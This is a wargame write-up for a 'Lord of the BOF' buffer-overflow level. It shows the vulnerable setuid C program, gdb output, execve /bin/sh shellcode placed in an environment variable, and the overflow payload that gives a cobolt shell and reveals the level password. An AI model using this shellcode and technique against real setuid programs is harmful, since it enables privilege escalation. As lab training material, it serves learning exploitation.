# Level2

## This level's goal 
- LEVEL2 (gremlin -> cobolt) : Small Buffer

***

```
[gremlin@localhost gremlin]$ bash2
[gremlin@localhost gremlin]$ ls -l
total 16
-rwsr-sr-x    1 cobolt   cobolt      11970 Feb 26  2010 cobolt
-rw-r--r--    1 gremlin  gremlin       291 Mar 29  2010 cobolt.c
[gremlin@localhost gremlin]$ cat cobolt.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - cobolt
        - small buffer
*/

int main(int argc, char *argv[])
{
    char buffer[16];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
```

This level's code seems like level1 but there is the difference of buffer' small size.

If you use the shell code (ex. 25bytes) will be problem but I will use with env variable I used in level1.

First thing I need is te get information of memory structure.

```
[gremlin@localhost gremlin]$ gdb -q cobolt
(gdb) set disass intel
(gdb) disass main
0x8048433 <main+3>:     sub    %esp,16
0x804845c <main+44>:    lea    %eax,[%ebp-16]
```

The buffer is only ebp-16, so there is no dummy in here.

So, the memory will be buffer(16bytes) + SFP(4bytes) + RET(4bytes).

```
[gremlin@localhost gremlin]$ export EGG=`python -c 'print "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
[gremlin@localhost gremlin]$ echo 'int main() { printf("EGG -> 0x%x\n", getenv("EGG")); } ' > getegg.c
[gremlin@localhost gremlin]$ gcc getegg.c -o getegg
[gremlin@localhost gremlin]$ ./getegg
EGG -> 0xbffffea2
```

Then the payload will be the dummy strings(20bytes, buffer+SFP) + the shell code's address.

```
[gremlin@localhost gremlin]$ ./cobolt `python -c 'print "A"*20+"\xa2\xfe\xff\xbf"'`
AAAAAAAAAAAAAAAAAAAA¢þÿ¿
bash$ id
uid=502(cobolt) gid=501(gremlin) egid=502(cobolt) groups=501(gremlin)
bash$ my-pass
euid = 502
hacking exposed
```
